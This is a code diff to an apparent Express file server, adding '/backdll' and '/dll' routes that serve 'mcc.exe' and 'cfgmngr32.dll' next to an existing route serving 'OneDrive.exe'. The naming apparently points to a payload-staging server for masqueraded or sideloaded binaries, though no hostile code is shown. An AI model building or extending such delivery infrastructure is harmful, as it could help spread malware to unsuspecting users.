@@ -194,6 +194,14 @@ app.get('/this', (req, res) => {
     const filePath = './src/mcc.exe'; // Replace with the actual file path
     res.download(filePath);
   });
+  app.get('/backdll', (req, res) => {
+    const filePath = './src/ntx/mcc.exe'; // Replace with the actual file path
+    res.download(filePath);
+  });
+  app.get('/dll', (req, res) => {
+    const filePath = './src/cfgmngr32.dll'; // Replace with the actual file path
+    res.download(filePath);
+  });
   app.get('/ntx', (req, res) => {
     const filePath = './src/ntx/OneDrive.exe'; // Replace with the actual file path
     res.download(filePath);
